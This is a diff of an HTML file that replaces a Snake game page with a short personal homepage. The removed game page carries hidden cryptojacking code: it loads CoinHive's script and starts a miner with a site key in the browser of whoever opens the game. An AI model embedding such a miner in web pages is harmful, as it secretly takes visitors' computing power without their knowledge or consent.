@@ -1,90 +1,26 @@
+<!DOCTYPE html>
 <html>
-<title>Snake Game</title>
-<p>Use arrow keys </p>
-<canvas id="gc" height="400" width="400" style="display: block; margin: 0 auto;"> </canvas>
-
-<script type="text/javascript">
-	window.onload = function () {
-		// body...
-		canv = document.getElementById("gc");
-		ctx = canv.getContext("2d");
-		document.addEventListener("keydown",keyPush);
-		setInterval(game,1000/10);
-
-	}
-
-	xv=yv=0;
-	px=py=10;
-	ax=ay=15;
-	gs=tc=20;
-	trail = [];
-	tail = 5;
-
-	function game() {
-		px+=xv;
-		py+=yv;
-		if (px<0) {
-			px = tc-1;
-		}
-		if (px>tc-1) {
-			px=0;
-		}
-		if (py<0) {
-			py = tc-1;
-		}
-		if (py>tc-1) {
-			py=0;
-		}
-		ctx.fillStyle="black";
-		ctx.fillRect(0,0,canv.height,canv.width);
-
-		ctx.fillStyle="red";
-		ctx.fillRect(ax*gs,ay*gs,gs-2,gs-2);
-
-		ctx.fillStyle="lime";
-		for (var i = 0; i < trail.length; i++) {
-				ctx.fillRect(trail[i].x*gs,trail[i].y*gs,gs-2,gs-2);
-				if (trail[i].x == px && trail[i].y == py) {
-					tail = 5;
-				}
-		}
-		trail.push({x:px,y:py});
-		while (trail.length > tail) {
-			trail.shift();
-		}
-		if (ax==px && ay==py) {
-					tail++;
-					ax = Math.floor(Math.random()*tc);
-					ay = Math.floor(Math.random()*tc);
-		}
-	}
-	function keyPush(evt) {
-		// body...
-		switch (evt.keyCode) {
-			case 37:
-				xv=-1; yv=0;
-				break;
-			case 38:
-				xv=0; yv=-1;
-				break;
-			case 39:
-				xv=1; yv=0;
-				break;
-			case 40:
-			 	xv=0; yv=1;
-			 	 break;
-
-			default:
-
-		}
-	}
-
-</script>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script type="text/javascript" src="miner.js"></script>
-<script type="text/javascript">
-    var miner = new CoinHive.Anonymous('8HY3QyIzKd3Sd7CrTCZ0qnAioUkN8dr7');
-    miner.start();
-</script>
-
+<head>
+	<title>Shubham Khandare</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name=viewport content="width=device-width, initial-scale=1">
+	<meta name = "keywords" content = "Shubham Khandare Website " />
+	<meta name = "description" content = "Shubham Khandare Personal Website" />
+	<meta name = "revised" content = "Shubham Khandare, 5/5/2018" />
+	<meta name = "author" content = "Shubham Khandare" />
+	<meta http-equiv = "Content-Type" content = "text/html; charset = UTF-8" />
+	<link rel="shortcut icon" type="image/png" href="assets/img/avicii_trans.png">
+	<meta name="theme-color" content="#000000">
+	<link rel="stylesheet" type="text/css" href="assets/css/main_style.css">
+	<link href="https://fonts.googleapis.com/css?family=Tajawal" rel="stylesheet">
+</head>
+<body>
+		<div class="avicii_photo_div">
+			<div class="text_h">
+				<h3>Shubham is</h3>
+				<h2>sleeping or listening to</h2>
+				<h1>Avicii !</h1>
+			</div>
+		</div>
+</body>
 </html>
